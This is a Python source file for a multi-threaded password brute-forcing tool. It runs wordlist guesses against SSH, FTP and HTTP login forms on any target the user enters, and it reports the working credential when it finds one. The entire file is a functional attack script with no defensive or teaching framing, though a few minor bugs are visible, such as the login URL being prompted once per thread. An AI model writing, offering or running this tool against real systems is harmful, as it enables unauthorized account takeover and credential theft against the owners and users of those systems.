import threading
import queue
import requests
import paramiko
import ftplib
import sys

# Define a queue to hold the wordlist
password_queue = queue.Queue()
found_event = threading.Event()  # Event to signal when the password is found
lock = threading.Lock()

# Read wordlist file and add to the queue
def load_wordlist(wordlist_file):
    with open(wordlist_file.strip(), 'r', encoding='utf-8', errors='ignore') as file:
        for line in file:
            password_queue.put(line.strip())

# Brute-force SSH
def ssh_brute_force(target, username, password_queue, total_passwords):
    while not password_queue.empty() and not found_event.is_set():
        password = password_queue.get()
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password)
            print(f'[+] SSH Login successful: {username}@{target} with password {password}')
            found_event.set()  # Signal that the password has been found
            break
        except paramiko.AuthenticationException:
            pass  # Ignore failed attempts
        except paramiko.SSHException as e:
            if "Error reading SSH protocol banner" in str(e):
                continue  # Skip to the next password
        except Exception as e:
            print(f"Unexpected error: {str(e)}")
        finally:
            ssh.close()
        
        with lock:
            completed = total_passwords - password_queue.qsize()
            percentage = (completed / total_passwords) * 100
            sys.stdout.write(f'\rProgress: {percentage:.2f}%')
            sys.stdout.flush()

# Brute-force HTTP Form
def http_brute_force(target, username, password_queue, login_url, form_data, total_passwords):
    while not password_queue.empty() and not found_event.is_set():
        password = password_queue.get()
        form_data['username'] = username
        form_data['password'] = password
        response = requests.post(login_url, data=form_data)
        if 'Login successful' in response.text:
            print(f'[+] HTTP Login successful: {username}@{target} with password {password}')
            found_event.set()  # Signal that the password has been found
            break
        
        with lock:
            completed = total_passwords - password_queue.qsize()
            percentage = (completed / total_passwords) * 100
            sys.stdout.write(f'\rProgress: {percentage:.2f}%')
            sys.stdout.flush()

# Brute-force FTP
def ftp_brute_force(target, username, password_queue, total_passwords):
    while not password_queue.empty() and not found_event.is_set():
        password = password_queue.get()
        try:
            ftp = ftplib.FTP(target)
            ftp.login(user=username, passwd=password)
            print(f'[+] FTP Login successful: {username}@{target} with password {password}')
            found_event.set()  # Signal that the password has been found
            break
        except ftplib.error_perm:
            pass  # Ignore failed attempts
        finally:
            ftp.quit()
        
        with lock:
            completed = total_passwords - password_queue.qsize()
            percentage = (completed / total_passwords) * 100
            sys.stdout.write(f'\rProgress: {percentage:.2f}%')
            sys.stdout.flush()

# Main function to initiate brute force
def main():
    target = input('Enter target IP/URL: ').strip()
    service = input('Enter service to brute-force (ssh/http/ftp): ').strip()
    username = input('Enter username: ').strip()
    wordlist = input('Enter path to wordlist: ').strip()
    load_wordlist(wordlist)
    
    total_passwords = password_queue.qsize()
    threads = []
    for _ in range(10):  # Number of threads
        if service == 'ssh':
            thread = threading.Thread(target=ssh_brute_force, args=(target, username, password_queue, total_passwords))
        elif service == 'http':
            login_url = input('Enter login URL: ').strip()
            form_data = {}  # Add any additional form data here if required
            thread = threading.Thread(target=http_brute_force, args=(target, username, password_queue, login_url, form_data, total_passwords))
        elif service == 'ftp':
            thread = threading.Thread(target=ftp_brute_force, args=(target, username, password_queue, total_passwords))
        else:
            print('Unsupported service!')
            return
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()

